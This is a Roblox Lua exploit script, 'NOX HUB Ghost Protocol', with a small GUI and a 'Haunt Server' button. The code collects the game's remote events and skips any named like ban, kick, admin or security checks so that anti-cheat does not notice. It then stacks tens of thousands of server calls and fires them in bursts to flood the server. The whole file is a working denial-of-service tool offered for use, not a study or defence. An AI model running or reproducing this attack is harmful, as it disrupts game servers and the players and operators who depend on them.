--[[
    🔱 NOX HUB v26.0 [GHOST-PROTOCOL] 🔱
    "You can't kill what you can't see."
    
    GHOST FEATURES:
    - [PURE REMOTE STACK] : Removes ALL physical movement packets (Fixed v25 Kick).
    - [INNOCENT PAYLOAD] : Sends 'true' or 'nil'. Invisible to anti-cheat sanitizers.
    - [SILENT ACCUMULATION] : Stacks 100,000 requests in memory without touching FPS.
    - [GHOST RELEASE] : Fires the stack in random batches to simulate lag bursts.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. GHOST ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Buffer = {} 
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- ULTRA SAFE FILTER
            -- We avoid anything that sounds like "Admin", "Ban", "Kick", "Security"
            if not (n:find("ban") or n:find("kick") or n:find("admin") or n:find("sec") or n:find("check")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Haunt(duration, updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    Engine.Buffer = {}
    
    Engine:Scan()
    
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- THE GHOST LOAD (100% Silent Reqeuests via Coroutines)
        -- We prepare functions that contain the FireServer call, but we don't call them.
        -- We just store the function itself.
        
        while tick() < EndTime do
            local remaining = math.ceil(EndTime - tick())
            updateCallback(remaining, "GHOSTING... ("..#Engine.Buffer.." SPIRITS)")
            
            -- Fill Buffer
            for i = 1, 500 do -- 500 per tick
                local r = Engine.Targets[math.random(1, #Engine.Targets)]
                if r then
                    -- We create a closure that holds the malicious intent
                    table.insert(Engine.Buffer, function()
                        pcall(function()
                            if r:IsA("RemoteEvent") then r:FireServer(true) -- 'true' is harmless but takes RAM
                            else r:InvokeServer(true) end
                        end)
                    end)
                end
            end
            RunService.Heartbeat:Wait()
        end
        
        -- THE MANIFESTATION (Release)
        updateCallback(0, "MANIFESTATION")
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="GHOST", Text="RELEASING..."})
        
        -- Fire the buffer in blocks to emulate a massive lag spike unfreezing
        -- We iterate backwards to avoid table re-indexing lag
        for i = #Engine.Buffer, 1, -1 do
            if Engine.Buffer[i] then
                coroutine.wrap(Engine.Buffer[i])()
            end
            if i % 1000 == 0 then RunService.Heartbeat:Wait() end -- Let chunks go through
        end
        
        Engine.Active = false
        Engine.Buffer = {}
        updateCallback(duration, "SYSTEM READY")
    end)
end

-- // 2. GHOST UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxGhost"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 350, 0, 200)
    Main.Position = UDim2.new(0.5, -175, 0.5, -100)
    Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Ghost White
    Main.BackgroundTransparency = 0.9
    Main.BorderSizePixel = 1
    Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
    
    -- BLUR EFFECT
    local Blur = Instance.new("BlurEffect", game:GetService("Lighting"))
    Blur.Enabled = false
    Blur.Size = 0
    
    -- TITLE
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "GHOST PROTOCOL v26.0"
    Title.Font = Enum.Font.GothamThin
    Title.TextColor3 = Color3.fromRGB(200, 200, 200)
    Title.TextSize = 18
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.BackgroundTransparency = 1
    
    -- STATUS
    local Status = Instance.new("TextLabel", Main)
    Status.Text = "INVISIBLE"
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0.4, 0)
    Status.TextColor3 = Color3.fromRGB(150, 150, 150)
    Status.Font = Enum.Font.Gotham
    Status.BackgroundTransparency = 1
    
    -- BUTTON
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.6, 0, 0.25, 0)
    Btn.Position = UDim2.new(0.2, 0, 0.65, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Btn.BackgroundTransparency = 0.8
    Btn.Text = "HAUNT SERVER (15s)"
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamLight
    Btn.TextSize = 14
    
    local BStroke = Instance.new("UIStroke", Btn)
    BStroke.Color = Color3.fromRGB(255, 255, 255)
    BStroke.Thickness = 1
    BStroke.Transparency = 0.5
    
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            -- Visual FX
            Blur.Enabled = true
            game:GetService("TweenService"):Create(Blur, TweenInfo.new(15), {Size = 20}):Play()
            
            Engine:Haunt(15, function(timeLeft, txt)
                Status.Text = txt
                Btn.Text = "GHOSTING... " .. timeLeft
                
                if timeLeft == 0 then
                    game:GetService("TweenService"):Create(Blur, TweenInfo.new(0.5), {Size = 0}):Play()
                    wait(0.5)
                    Blur.Enabled = false
                    Btn.Text = "HAUNT SERVER (15s)"
                end
            end)
        end
    end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
    
    -- Cleanup Blur on Remove
    Main.AncestryChanged:Connect(function()
        if not Main.Parent then Blur:Destroy() end
    end)
end

Nox:CreateUI()
